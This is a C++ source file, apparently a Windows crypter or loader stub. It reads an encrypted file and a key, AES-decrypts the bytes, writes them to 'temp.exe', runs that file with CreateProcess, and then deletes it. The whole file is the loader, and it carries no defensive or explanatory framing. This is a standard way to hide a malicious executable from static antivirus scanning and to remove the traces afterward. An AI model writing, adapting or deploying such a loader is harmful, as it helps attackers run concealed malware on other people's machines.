#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <stdexcept>
#include <cryptopp/aes.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>
#include <cryptopp/osrng.h>
#include <cryptopp/hex.h>
#include <windows.h>

using namespace std;
using namespace CryptoPP;

vector<byte> readFile(const string& filename) {
    ifstream file(filename, ios::binary);
    if (!file.is_open()) {
        throw runtime_error("Failed to open file");
    }
    return vector<byte>(istreambuf_iterator<char>(file), {});
}

void writeFile(const string& filename, const vector<byte>& data) {
    ofstream file(filename, ios::binary);
    if (!file.is_open()) {
        throw runtime_error("Failed to open file");
    }
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
}

void executePayload(const vector<byte>& payload) {
    // Write payload to a temporary file
    string tempFilename = "temp.exe";
    writeFile(tempFilename, payload);

    // Execute the payload
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcess(tempFilename.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        // Wait until the process exits
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        throw runtime_error("Failed to execute payload");
    }

    // Remove the temporary file
    remove(tempFilename.c_str());
}

int main() {
    try {
        string encryptedFilename = "encrypted_bytes.bin";
        string keyFilename = "key.txt";

        vector<byte> encBytes = readFile(encryptedFilename);
        vector<byte> keyBytes = readFile(keyFilename);

        // Decrypt the bytes in blocks
        vector<byte> decryptedBytes(encBytes.size());
        ECB_Mode<AES>::Decryption decryption;
        decryption.SetKey(keyBytes.data(), keyBytes.size());

        ArraySource(encBytes.data(), encBytes.size(), true,
            new StreamTransformationFilter(decryption,
                new ArraySink(decryptedBytes.data(), decryptedBytes.size())
            )
        );

        // Execute the decrypted payload
        executePayload(decryptedBytes);

        cout << "Execution complete." << endl;
    } catch (const exception& ex) {
        cerr << "Error: " << ex.what() << endl;
        return 1;
    }

    return 0;
}
